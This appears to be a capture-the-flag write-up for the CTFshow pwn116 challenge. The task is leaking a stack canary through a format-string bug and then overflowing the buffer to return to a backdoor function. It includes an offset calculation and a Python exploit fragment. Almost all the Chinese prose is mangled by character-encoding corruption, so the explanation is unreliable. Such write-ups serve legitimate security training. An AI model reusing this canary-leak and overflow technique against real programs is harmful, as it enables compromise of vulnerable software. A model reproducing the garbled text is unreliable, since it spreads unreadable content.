---
title: CTFshow pwn116 鍐嶅仛涓€娆℃牸寮忓寲瀛楃涓叉硠闇?Canary
published: 2026-04-17
updated: 2026-04-17
description: 鍜?pwn115 鏄悓涓€绫绘墦娉曪紝鍙槸鏍煎紡鍖栧瓧绗︿覆鍋忕Щ鍜屾孩鍑哄竷灞€鍙樹簡锛屾湰璐ㄤ粛鏄厛 leak canary 鍐?ret2text銆
tags: [CTFshow, Pwn, Stack, Canary, Format String]
category: ctfshow
draft: false
---

# 棰樼洰缁撹

杩欓鏈川涓婂氨鏄?pwn115 鐨勫彉浣擄紝宸埆涓昏鍦ㄤ袱涓湴鏂癸細

- canary 鐨勬牸寮忓寲瀛楃涓插亸绉讳笉鍚?- 鏍堜笂缂撳啿鍖哄埌杩斿洖鍦板潃鐨勮窛绂讳笉鍚?
## 鍋忕Щ璁＄畻

鍘熷绗旇涓殑璁＄畻鏄細

```text
(0x2C - 0xC) / 4 + 7 = 15
```

鍥犳 leak 璇彞鏀逛负 `%15$p`銆?
## 鍏抽敭 exp 鐗囨

```python
Leak = b'aaaa' + b'%15$p'
p.sendline(Leak)
p.recvuntil(b'aaaa0x')
canary = int(p.recv(8), 16)
payload = b'a' * (0x2c - 0xc) + p32(canary) + b'a' * 0xc + p32(backdoor)
```

## 涓嬭浇

- [涓嬭浇棰樼洰闄勪欢 `pwn`](../../attachments/ctfshow/pwn116/pwn)
- [涓嬭浇鍒╃敤鑴氭湰 `exp.py`](../../attachments/ctfshow/pwn116/exp.py)
- [涓嬭浇鍘熷绗旇 `Bypass_pwn116.md`](../../attachments/ctfshow/pwn116/Bypass_pwn116.md)

## 閫傚悎璁颁綇鐨勭偣

鍚屼竴绫婚锛岀湡姝ｈ浼氱殑鏄€滃亸绉绘€庝箞绠椻€濓紝鑰屼笉鏄璁版煇涓€涓?`%55$p` 鎴?`%15$p`銆?

